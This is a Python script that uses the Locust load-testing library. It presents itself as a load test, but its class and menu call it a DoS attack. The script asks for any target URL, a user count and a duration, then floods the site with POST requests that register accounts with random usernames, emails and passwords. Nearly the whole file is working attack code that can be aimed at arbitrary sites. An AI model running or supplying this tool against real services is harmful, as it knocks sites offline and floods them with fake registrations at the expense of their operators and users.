import time
from locust import HttpUser, task, constant, events
from locust.env import Environment
from locust.stats import stats_printer, stats_history
from locust.log import setup_logging
import gevent
import random
import string
charactres = string.ascii_letters 
passs = string.digits

class DOSAttackUser(HttpUser):
    wait_time = constant(1)
    fixed_count = 1
    
    target_path = "/"
    
    @task
    def send_request(self):
        randomUsername = ''.join(random.choice(charactres) for i in range(10))
        randomPassword=''.join(random.choice(passs)  for i in range(10))
        randomEmail = randomUsername + "@mail.ru"
        response = self.client.post(
            self.target_path,
            #json={"UserName": "TestUser123", "Password": "1233211Nik"} -- авториз
            json={"UserName": randomUsername ,"Email": randomEmail , "Password":randomPassword}
        )
        response_json = response.json()
        print(f"Status: {response.status_code} | Time: {response.elapsed.total_seconds():.2f}s |Answer: {response_json}")

def run_load_test(base_url, users, spawn_rate, duration):
    setup_logging("INFO", None)
    
    
    if "/" in base_url.split("//")[1]:
        host, path = base_url.split("//")[1].split("/", 1)
        DOSAttackUser.target_path = "/" + path
        base_url = base_url.split("//")[0] + "//" + host
    
    env = Environment(user_classes=[DOSAttackUser], events=events)
    env.host = base_url
    
    runner = env.create_local_runner()
    
    gevent.spawn(stats_printer(env.stats))
    gevent.spawn(stats_history, env.runner)
    
    runner.start(users, spawn_rate=spawn_rate)
    gevent.spawn_later(duration, lambda: runner.quit())
    runner.greenlet.join()
    
    print("\nTest completed!")
    print(f"Total requests: {env.stats.total.num_requests}")
    print(f"Failures: {env.stats.total.num_failures}")

def main():
    print(""" 
     _      _____   ___  ______   _____  _____  _____  _____ 
    | |    |  _  | / _ \ |  _  \ |_   _||  ___|/  ___||_   _|
    | |    | | | |/ /_\ \| | | |   | |  | |__  \ `--.   | |  
    | |    | | | ||  _  || | | |   | |  |  __|  `--. \  | |  
    | |____\ \_/ /| | | || |/ /    | |  | |___ /\__/ /  | |  
    \_____/ \___/ \_| |_/|___/     \_/  \____/ \____/   \_/  
    """)
    print("Welcome To Load Test. Version 2.1\n")
    
    while True:
        print("Select attack type:\n1. DOS-attack")
        choice = input("> ").strip()
        
        if choice == "1":
            while True:
                url = input("Enter target URL (e.g., http://example.com/api): ").strip()
                if url.startswith(("http://", "https://")):
                    break
                print("Invalid URL. Must start with http:// or https://")
            
            users = int(input("Number of concurrent users [100]: ") or "100")
            spawn_rate = int(input("Users spawn rate per second [10]: ") or "10")
            duration = int(input("Test duration in seconds [60]: ") or "60")
            
            print(f"\nStarting attack on {url}...")
            run_load_test(
                base_url=url,
                users=users,
                spawn_rate=spawn_rate,
                duration=duration
            )
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()